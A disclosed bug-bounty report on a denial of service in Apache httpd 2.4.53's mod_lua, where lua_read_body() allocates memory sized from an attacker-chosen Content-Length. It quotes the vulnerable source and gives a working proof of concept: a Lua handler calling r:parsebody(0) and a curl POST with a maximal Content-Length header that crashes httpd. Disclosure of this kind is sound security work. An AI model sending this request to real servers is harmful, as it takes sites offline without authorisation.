# DoS via lua_read_body() [zhbug_httpd_94]

## Report Details
- **Report ID**: 1596252
- **URL**: https://hackerone.com/reports/1596252
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-06-09T20:12:04.044Z
- **Disclosed**: 2022-07-09T20:19:39.520Z

## Reporter
- **Username**: tdp3kel9g
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Greetings. I have found a bug that can crash httpd 2.4.53, causing a denial of service.

The bug is that lua_read_body() (modules/lua/lua_request.c) uses the value of the `Content-Length` header to allocate memory. While ap_read_request() limits `Content-Length`'s value to a non-negative |apr_off_t| via a call to ap_parse_strict_length(), if the LUA programmer uses r:parsebody() without specifying a limit, as in:
```
   r:parsebody(0)
```
, lua_read_body() attempts to allocate `Content-Length + 1` bytes (line 255, below). This causes an OOM abort, which crashes httpd:
```
233: static int lua_read_body(request_rec *r, const char **rbuf, apr_off_t *size,
234:         apr_off_t maxsize)
235: {
236:     int rc = OK;
237:
238:     *rbuf = NULL;
239:     *size = 0;
240:
241:     if ((rc = ap_setup_client_block(r, REQUEST_CHUNKED_ERROR))) {
242:         return (rc);
243:     }
244:     if (ap_should_client_block(r)) {
245:
246:         /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
247:         apr_off_t    len_read = -1;
248:         apr_off_t    rpos = 0;
249:         apr_off_t length = r->remaining;
250:         /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
251:
252:         if (maxsize != 0 && length > maxsize) {
253:             return APR_EINCOMPLETE; /* Only room for incomplete data chunk */
254:         }
255:         *rbuf = (const char *) apr_pcalloc(r->pool, (apr_size_t) (length + 1));
...
271: }
```
The bug appears still to be present in trunk.

Attached is a POC that demonstrates the bug. Use the POC thusly:

   1. Copy bug94.lua into /bug94/bug94.lua .
   2. Enable LUA.
   3. Run httpd and attach a debugger to it.
   4. Set a BP on lua_read_body() line 249.
   5. Run the command
```
      curl -v -i -H "Content-Type: multipart/form-data; boundary=badbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadb" -H "Content-Length: 9223372036854775807" -X POST -k http://127.0.0.1/bug94/bug94.lua
```
   which sends the bad header to httpd.

   6. When the BP fires, step line 249 and examine |length|. It should be `0x7fffffffffffffff` .
   7. Now step into apr_palloc(). Notice that |size| is `0x8000000000000000`. Step over the call to allocator_alloc(), which should return NULL. Then notice that apr_palloc() calls |pool->abortfn()|, which is abort_on_oom() (server/main.c). That, in turn, calls ap_abort_on_oom(), which calls the C library function abort(), crashing the httpd process.

```
-------- bug94.lua ----------------------------------------------------
function handle(r)
    local s = r:parsebody(0)
end
-------- bug94.lua ----------------------------------------------------
```

## Impact

This bug permits a remote unauthenticated attacker to crash httpd. In mitigation, the victim site must run an LUA program including a call to `r:parsebody(0)`.

## Attachments
No attachments
